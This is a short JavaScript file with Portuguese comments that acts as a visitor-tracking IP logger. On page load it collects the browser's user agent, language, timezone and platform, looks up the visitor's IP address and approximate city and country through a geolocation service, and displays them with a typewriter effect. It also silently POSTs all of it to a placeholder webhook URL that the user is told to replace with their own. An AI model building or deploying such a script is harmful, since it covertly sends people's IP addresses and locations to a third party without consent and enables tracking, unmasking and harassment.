// Função para coletar informações do usuário
function collectUserInfo() {
  const userAgent = navigator.userAgent;
  const language = navigator.language || navigator.userLanguage;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const platform = navigator.platform;

  return {
    userAgent,
    language,
    timezone,
    platform
  };
}

// Função para obter localização aproximada via IP
async function getLocation() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return {
      ip: data.ip,
      city: data.city,
      region: data.region,
      country: data.country_name
    };
  } catch (error) {
    return {
      ip: 'Desconhecido',
      city: 'Desconhecida',
      region: 'Desconhecida',
      country: 'Desconhecido'
    };
  }
}

// Função para enviar dados para o webhook
async function sendToWebhook(data) {
  const webhookURL = 'https://seu-webhook-url.com'; // Substitua pela sua URL de webhook

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
  } catch (error) {
    console.error('Erro ao enviar para o webhook:', error);
  }
}

// Função para exibir texto com efeito de digitação
function typeWriter(text, elementId, delay = 50) {
  const element = document.getElementById(elementId);
  let i = 0;

  function typing() {
    if (i < text.length) {
      element.textContent += text.charAt(i);
      i++;
      setTimeout(typing, delay);
    }
  }

  typing();
}

// Função principal para executar as ações
async function main() {
  const userInfo = collectUserInfo();
  const locationInfo = await getLocation();

  const combinedInfo = {
    ...userInfo,
    ...locationInfo
  };

  const infoText = `
IP: ${combinedInfo.ip}
Navegador: ${combinedInfo.userAgent}
Idioma: ${combinedInfo.language}
Fuso Horário: ${combinedInfo.timezone}
Sistema Operacional: ${combinedInfo.platform}
Localização: ${combinedInfo.city}, ${combinedInfo.region}, ${combinedInfo.country}
  `;

  typeWriter(infoText, 'typewriter');
  await sendToWebhook(combinedInfo);
}

// Executa a função principal após o carregamento da página
window.onload = main;
